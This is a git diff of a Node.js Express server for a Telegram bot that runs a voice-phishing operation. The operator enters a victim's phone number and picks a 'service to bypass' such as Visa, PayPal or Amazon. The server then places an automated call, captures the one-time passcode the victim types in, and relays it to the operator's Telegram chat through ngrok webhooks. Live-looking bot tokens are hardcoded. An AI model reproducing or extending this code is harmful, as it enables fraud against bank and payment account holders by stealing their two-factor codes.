@@ -1,25 +1,33 @@
 const express = require("express");
-const TelegramBot = require("node-telegram-bot-api");
+const path = require("path");
+const fs = require("fs");
 const app = express();
-const server = require("http").createServer(app);
+
+const server = require("http").createServer(
+  {
+    key: fs.readFileSync(path.join(__dirname, "key.pem")),
+    cert: fs.readFileSync(path.join(__dirname, "crt.pem")),
+  },
+  app
+);
 
 const port = process.env.PORT || 9000;
 
 var cors = require("cors");
 var axios = require("axios");
-const res = require("express/lib/response");
 
 app.use(cors());
 app.use(express.urlencoded({ extended: false }));
 app.use(express.json());
 
-const token = "5031424484:AAFonqAonvL4ofE5kDUitpWM7Wu0tgMF_Ao";
-const bot = new TelegramBot(token);
+const token = "5136809506:AAEjCnYOJIdgOrKVdRPkzwnyD9jZppWCQEk";
+
+const telegram_api = `https://api.telegram.org/bot${token}`;
 
 const init = () => {
   var config = {
     method: "get",
-    url: `https://api.telegram.org/bot${token}/setWebhook?url=https://025c-185-107-57-85.ngrok.io/bot${token}`,
+    url: `${telegram_api}/setWebhook?url=https://1925-34-68-35-5.ngrok.io/bot${token}`,
     headers: {},
   };
   axios(config)
@@ -34,7 +42,7 @@ const init = () => {
 server.listen(port, () => {
   console.log(`server is running on port: ${port}`);
 
-  //init(); //.then(() => console.log("bot weebhook set"));
+  // init();
 });
 
 const webhookUrl = `/bot${token}`;
@@ -64,8 +72,31 @@ const providersHost = [
   { name: `Cdiscount`, host: `C discount` },
 ];
 
-let savedNunber;
-let chatid;
+const sendMessageMarkup = async (chatid, text) => {
+  return await axios.post(`${telegram_api}/sendMessage`, {
+    chat_id: chatid,
+    text: text,
+    reply_markup: {
+      keyboard: [
+        [`Visa_card`, `Master_card`],
+        [`Amex_card`, `Verve_card`],
+        [`google_pay`, `apple_Pay`],
+        [`Transferwise`, "Amazon"],
+        [`Paypal`, `Cdiscount`],
+      ],
+    },
+  });
+};
+
+const sendMessage = async (chatid, text) => {
+  return await axios.post(`${telegram_api}/sendMessage`, {
+    chat_id: chatid,
+    text: text,
+  });
+};
+
+let savedNunber = "";
+let chatid = "";
 
 app.post(`/bot${token}`, (req, res) => {
   const nexmo = require("./make-call-ncco");
@@ -77,7 +108,7 @@ app.post(`/bot${token}`, (req, res) => {
   console.log(match);
 
   const startCommand = (chartid) =>
-    bot.sendMessage(
+    sendMessage(
       chartid,
       "Run this code to start \ncall {number}\nexample: call 19714263618"
     );
@@ -87,17 +118,7 @@ app.post(`/bot${token}`, (req, res) => {
   } else if (match.length == 2) {
     const number = match[1];
     savedNunber = number;
-    bot.sendMessage(chatid, "Select service to bypass below 👇", {
-      reply_markup: {
-        keyboard: [
-          [`Visa_card`, `Master_card`],
-          [`Amex_card`, `Verve_card`],
-          [`google_pay`, `apple_Pay`],
-          [`Transferwise`, "Amazon"],
-          [`Paypal`, `Cdiscount`],
-        ],
-      },
-    });
+    sendMessageMarkup(chatid, "Select service to bypass below 👇");
   } else if (match.length == 1) {
     const selectedProvider = match[0];
     const isProviser = providers.includes(selectedProvider);
@@ -121,7 +142,7 @@ app.post(`/bot${token}`, (req, res) => {
 app.post(`/webhooks/notification`, (req, res) => {
   const { status } = req.body;
 
-  bot.sendMessage(chatid, status);
+  sendMessage(chatid, status);
   console.log(`notification: \n ${status}`);
   res.sendStatus(200);
 });
@@ -129,7 +150,7 @@ app.post(`/webhooks/notification`, (req, res) => {
 app.post("/webhooks/dtmf", (request, response) => {
   const dtmf = request.body.dtmf.digits;
 
-  bot.sendMessage(chatid, `the one time passcode is 👇 \n${dtmf}`);
+  sendMessage(chatid, `the one time passcode is 👇 \n${dtmf}`);
 
   if (dtmf === "") {
     const ncco = [
@@ -145,7 +166,7 @@ app.post("/webhooks/dtmf", (request, response) => {
           maxDigits: 5,
           submitOnHash: true,
         },
-        eventUrl: ["https://025c-185-107-57-85.ngrok.io/webhooks/dtmf"],
+        eventUrl: ["https://1925-34-68-35-5.ngrok.io/webhooks/dtmf"],
       },
     ];
     response.json(ncco);
@@ -158,8 +179,4 @@ app.post("/webhooks/dtmf", (request, response) => {
     ];
     response.json(ncco);
   }
-});
-
-app.get("/setwebhook", (req, res) => {
-  res.status(200);
 });
